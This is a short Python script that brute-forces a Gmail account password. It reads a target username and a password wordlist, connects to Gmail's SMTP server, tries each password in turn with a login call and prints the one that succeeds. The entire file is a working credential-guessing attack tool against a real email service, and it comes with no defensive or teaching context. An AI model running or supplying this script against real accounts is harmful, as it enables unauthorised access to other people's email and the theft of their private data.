#!/usr/bin/python

import smtplib
from termcolor import colored

def brute_mail():
    email = input("Enter Gmail username: ")
    passwd_file_path = input("Enter Gmail password file path: ")
    passwd_file = open(passwd_file_path, 'r')
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except:
        print("Error: Verify Gmail SMTP settings.")
        exit()

    for password in passwd_file:
        password = password.strip('\n')
        try:
            server.login(email, password)
            print(colored("[+] Password found: %s" % password, 'green'))
            break
        except smtplib.SMTPAuthenticationError:
            print(colored("[-] Error: Not a valid password.", 'red'))
    server.quit()

brute_mail()